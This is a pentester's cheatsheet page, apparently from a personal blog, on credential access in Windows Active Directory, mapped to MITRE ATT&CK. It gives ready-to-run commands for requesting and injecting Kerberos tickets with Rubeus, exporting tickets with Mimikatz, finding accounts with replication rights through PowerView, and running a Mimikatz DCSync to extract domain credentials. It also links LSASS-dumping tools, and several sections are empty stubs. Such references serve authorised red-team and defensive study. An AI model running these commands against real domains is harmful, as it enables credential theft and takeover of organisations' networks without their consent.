---
layout: post
title: TA0006 Credentials Access
parent: Pentesting
category: Pentesting
grand_parent: Cheatsheets
modified_date: 2022-09-07
permalink: /:categories/:title/
---

<!-- vscode-markdown-toc -->
* [PRE-REQUISITES](#PRE-REQUISITES)
	* [WHICH OS ? WHAT CREDS ?](#WHICHOSWHATCREDS)
	* [Rubeus](#Rubeus)
	* [Other tools](#Othertools)
* [T1558: Steal and Forge Kerberos Tickets](#T1558:StealandForgeKerberosTickets)
	* [Kerberos ASKTGT](#KerberosASKTGT)
	* [Import / Export Tickets](#ImportExportTickets)
* [DCSync attack](#DCSyncattack)
* [NTDS.dit dump](#NTDS.ditdump)
* [LSASS.exe dump](#LSASS.exedump)
* [SAM dump](#SAMdump)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

## <a name='PRE-REQUISITES'></a>PRE-REQUISITES

### <a name='WHICHOSWHATCREDS'></a>WHICH OS ? WHAT CREDS ?

![Windows Credentials by Auth. Service & by OS](/assets/images/win-delpy-creds-table-by-os-til-2012.png)

TO READ: [OS credentials dumping - mitre T1003](https://attack.mitre.org/techniques/T1003/001/)

### <a name='Rubeus'></a>Rubeus 
```powershell
# compilation
```

### <a name='Othertools'></a>Other tools
- Mimikatz: [Cheatsheet]() / [Repository]() / [Binaries]()
- Pypykatz: [Cheatsheet]() / [Repository]()
- Impacket: [Cheatsheet](https://www.hackingarticles.in/abusing-kerberos-using-impacket/) / [Repository]()
- lsassy:  [Cheatsheet]() / [Repository](https://github.com/Hackndo/lsassy)
- lsass-shtinkering: [Repository](https://github.com/deepinstinct/Lsass-Shtinkering)
- masky: [Repository](https://github.com/Z4kSec/Masky)
- donpapi: [Repository](https://github.com/login-securite/DonPAPI)


## <a name='T1558:StealandForgeKerberosTickets'></a>T1558: Steal and Forge Kerberos Tickets 

[Wiki Rubeus](https://github.com/GhostPack/Rubeus)

### <a name='KerberosASKTGT'></a>Kerberos ASKTGT 
```powershell
# Path on VM Mandiant Commando
cd C:\Tools\GhostPack\Rubeus\Rubeus\bin\Debug
./Rubeus.exe asktgt /user:$zlat_user /password:"PASSWORD" /domain:$zdom /dc:$zdom_dc_fqdn /ptt
```

### <a name='ImportExportTickets'></a>Import / Export Tickets
```powershell
cd C:\tools\mimikatz\x64
mimikatz.exe privilege:debug
kerberos::list /export
```

## <a name='DCSyncattack'></a>DCSync attack

- [T1003.006](https://attack.mitre.org/techniques/T1003/006) DCSYNC

```powershell
# get the account's SID 
get-netuser $zlat_user -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select objectsid

# retrieve *most* users who can perform DC replication for dev.<Domain>.local (i.e. DCsync)
Get-DomainObjectAcl $zdom_dn -ResolveGUIDs  -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | ? {
    ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
}

# check the ACL permissions
Get-ObjectAcl -Identity $zdom_dn -DomainController $zdom_dc_fqdn -Domain $zdom_fqdn -ResolveGUIDs | ? {$_.ObjectSID -match "S-1-5-21-xxx"}

# run the DCsync
mimikatz.exe privilege:debug
lsadump::dcsync /dc:$zdom_dc /domain:$zdom_fqdn /user:$zlat_user
```

## <a name='NTDS.ditdump'></a>NTDS.dit dump


## <a name='LSASS.exedump'></a>LSASS.exe dump

- [lsassy](https://github.com/Hackndo/lsassy)
- [lsass-shtinkering](https://github.com/deepinstinct/Lsass-Shtinkering)

## <a name='SAMdump'></a>SAM dump
